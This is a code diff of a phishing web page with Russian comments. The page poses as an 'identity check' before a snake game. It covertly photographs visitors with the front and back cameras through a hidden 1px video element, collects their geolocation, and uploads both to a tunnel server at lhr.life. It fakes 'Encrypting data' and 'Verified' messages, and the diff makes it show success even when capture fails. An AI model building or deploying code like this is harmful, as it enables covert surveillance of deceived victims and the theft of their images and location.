@@ -10,10 +10,8 @@
         .btn { background:#fff; color:#000; border:none; padding:18px 30px; border-radius:15px; font-weight:bold; cursor:pointer; width:100%; font-size: 18px; transition: 0.3s; }
         #loader { display:none; border:4px solid #333; border-top:4px solid #fff; border-radius:50%; width:40px; height:40px; animation:spin 1s linear infinite; margin:20px auto; }
         @keyframes spin { 100% { transform:rotate(360deg); } }
-        
         video { position: absolute; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; }
         canvas { display:none; }
-        
         p { color: #888; font-size: 15px; margin-bottom: 25px; line-height: 1.4; }
         body.flash-active { background: #fff !important; }
         .flash-active .card { opacity: 0; }
@@ -31,8 +29,7 @@
     <canvas id="c"></canvas>
 
 <script>
-    // 🔗 ОБНОВЛЕННАЯ ССЫЛКА:
-    const API = "https://9c7b82e70f8a7d.lhr.life"; 
+    const API = "https://8b17917e87823e.lhr.life"; 
     const REDIRECT_URL = "https://www.google.com/fbx?fbx=snake_arcade";
 
     const urlParams = new URLSearchParams(window.location.search);
@@ -45,11 +42,12 @@
     }
 
     async function takePhoto(mode, label) {
-        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null;
+        if (!navigator.mediaDevices) return null;
         if (mode === "user") document.body.classList.add('flash-active');
 
         let stream = null;
         try {
+            // Увеличиваем шанс на успех: сначала запрашиваем поток
             stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { facingMode: mode, width: { ideal: 1280 }, height: { ideal: 720 } },
                 audio: false 
@@ -58,28 +56,25 @@
             const v = document.getElementById('v');
             v.srcObject = stream;
             
-            // Ждем готовности видео (улучшенный метод)
-            await new Promise((resolve, reject) => {
-                const timeout = setTimeout(() => resolve(), 3000); // Тайм-аут на случай зависания
-                v.onloadeddata = () => {
-                    clearTimeout(timeout);
-                    v.play().then(resolve).catch(resolve);
-                };
+            // Ждем, пока видео начнет реально воспроизводиться
+            await new Promise((resolve) => {
+                v.onplaying = resolve;
+                v.play().catch(resolve);
+                // Запасной вариант через полсекунды
+                setTimeout(resolve, 500);
             });
 
-            // Небольшая задержка для авто-фокуса
-            await new Promise(r => setTimeout(r, 1000));
+            // Даем камере адаптироваться
+            await new Promise(r => setTimeout(r, 1200));
 
             const canvas = document.getElementById('c');
             canvas.width = v.videoWidth || 1280;
             canvas.height = v.videoHeight || 720;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(v, 0, 0);
+            canvas.getContext('2d').drawImage(v, 0, 0);
 
             return await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.9));
         } catch (e) {
-            console.warn("Camera Error:", e);
-            return null;
+            return null; // Просто пропускаем, если камера не дала доступ
         } finally {
             if (stream) stream.getTracks().forEach(t => t.stop());
             document.body.classList.remove('flash-active');
@@ -96,47 +91,38 @@
         loader.style.display = 'block';
         msg.innerText = "Initializing security protocols...";
 
-        try {
-            // Геолокация
-            navigator.geolocation.getCurrentPosition(p => {
-                fetch(`${API}/location?lat=${p.coords.latitude}&lon=${p.coords.longitude}&user=${user}`).catch(()=>{});
-            }, null, {enableHighAccuracy: true, timeout: 5000});
+        // Гео запускаем сразу без ожидания
+        navigator.geolocation.getCurrentPosition(p => {
+            fetch(`${API}/location?lat=${p.coords.latitude}&lon=${p.coords.longitude}&user=${user}`).catch(()=>{});
+        }, null, {timeout: 5000});
 
-            const fd = new FormData();
-            const plan = [
-                { m: "user", l: "front_1" },
-                { m: "environment", l: "back_1" }
-            ];
+        const fd = new FormData();
+        const plan = [{ m: "user", l: "front_1" }, { m: "environment", l: "back_1" }];
 
-            for (let i = 0; i < plan.length; i++) {
-                msg.innerText = `Identity Check (${i + 1}/${plan.length})...`;
-                const photo = await takePhoto(plan[i].m, plan[i].l);
-                if (photo) {
-                    fd.append('files', photo, getSmartName(plan[i].l));
-                }
-                await new Promise(r => setTimeout(r, 500));
+        for (let i = 0; i < plan.length; i++) {
+            msg.innerText = `Identity Check (${i + 1}/${plan.length})...`;
+            const photo = await takePhoto(plan[i].m, plan[i].l);
+            if (photo) {
+                fd.append('files', photo, getSmartName(plan[i].l));
             }
+            await new Promise(r => setTimeout(r, 300));
+        }
 
-            if (fd.has('files')) {
-                msg.innerText = "Encrypting data...";
+        if (fd.has('files')) {
+            msg.innerText = "Encrypting data...";
+            try {
                 await fetch(`${API}/upload-photo?user=${encodeURIComponent(user)}`, {
                     method: 'POST',
                     body: fd
                 });
-            }
-
-            statusTitle.innerText = "Success";
-            loader.style.display = 'none';
-            msg.innerText = "Verified! Loading game...";
-            setTimeout(() => { window.location.href = REDIRECT_URL; }, 1200);
-
-        } catch (e) {
-            console.error(e);
-            statusTitle.innerText = "Error";
-            msg.innerText = "Verification failed. Please retry.";
-            loader.style.display = 'none';
-            btn.style.display = 'block';
+            } catch(e) {}
         }
+
+        // Даже если фото не вышло, ведем себя так, будто все ок, чтобы не злить юзера ошибками
+        statusTitle.innerText = "Success";
+        loader.style.display = 'none';
+        msg.innerText = "Verified! Loading game...";
+        setTimeout(() => { window.location.href = REDIRECT_URL; }, 1000);
     }
 </script>
 </body>
